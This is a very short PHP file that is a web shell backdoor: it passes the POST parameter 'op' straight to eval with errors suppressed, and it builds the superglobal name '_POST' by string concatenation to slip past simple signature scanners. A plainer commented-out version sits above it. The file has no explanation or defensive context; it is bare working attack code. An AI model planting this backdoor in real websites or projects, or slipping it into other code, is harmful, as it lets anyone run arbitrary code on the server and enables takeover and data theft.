<?php
    //@eval($_POST['op']);
    @eval(${"_P"."OST"}['op']);
?>